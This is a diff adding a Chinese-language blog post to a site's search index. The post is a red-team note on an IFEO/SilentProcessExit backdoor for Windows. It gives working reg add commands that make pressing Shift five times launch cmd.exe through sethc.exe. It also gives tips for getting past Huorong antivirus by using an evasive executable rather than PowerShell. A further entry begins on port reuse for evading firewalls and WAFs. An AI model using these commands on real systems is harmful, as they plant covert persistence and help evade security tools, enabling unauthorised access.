@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>另类映像劫持后门(IFEO)</title>
+    <url>/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/</url>
+    <content><![CDATA[<p><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/5.png" alt="实验"></p>
+<a id="more"></a>
+<p>本文参考<a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247484800&idx=1&sn=c1cac92835fcbf38b75782c989b9f044&chksm=cf4d8ae1f83a03f7fc7136178acdf95b92cc411355f30d25cef2dc44c81a7254e057f8262b19&mpshare=1&scene=23&srcid=07315WlxNuEs38QSlbyhDcyW&sharer_sharetime=1596183314141&sharer_shareid=1d856175a36c81255db9e3c88a0b9519%23rd" target="_blank" rel="noopener">红队建设</a></p>
+<p>这里复现为了做个笔记,也有一些小坑总结</p>
+<p>在system权限修改注册表如下</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">reg add "HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\s</span>ethc.exe" /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"></span><br><span class="line">reg add "HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>ilentProcessExit<span class="symbol">\s</span>ethc.exe" /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line">reg add "HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>ilentProcessExit<span class="symbol">\s</span>ethc.exe" /v MonitorProcess /t REG_SZ /d "C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe"</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/1.png" alt="注册表"><br><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/2.png" alt="注册表"></p>
+<p>这里按5次Shift来触发paylaod.执行顺序<br>粘贴键执行完成——&gt;执行paylaod.<br>注意操作系统是windows7以后才能成功.这里在执行下面这条语句的时候火绒回进行拦截警告.</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">reg add "HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>ilentProcessExit<span class="symbol">\s</span>ethc.exe" /v MonitorProcess /t REG_SZ /d "C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe"</span><br></pre></td></tr></table></figure>
+<p>如果目标主机存在火绒而你使用的powershell来执行火绒会直接拦截,从他拦截提示显示拦截powershell.exe,所以这里建议直接进行exe文件(要免杀).<br><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/3.png" alt="火绒"></p>
+<h2 id="实验效果"><a href="#实验效果" class="headerlink" title="实验效果"></a>实验效果</h2><p><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/4.png" alt="实验"><br><img data-src="/2020/07/31/%E5%8F%A6%E7%B1%BB%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/5.png" alt="实验"></p>
+]]></content>
+      <categories>
+        <category>权限维持</category>
+      </categories>
+      <tags>
+        <tag>权限维持</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网端口复用</title>
     <url>/2020/07/28/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/</url>
     <content><![CDATA[<p>端口复用目的是为了躲避防火墙或者服务器只对外开放某一端口(80端口或其他任意少量端口)，其他端口全部被封死.最终目的就是躲避waf检测</p>
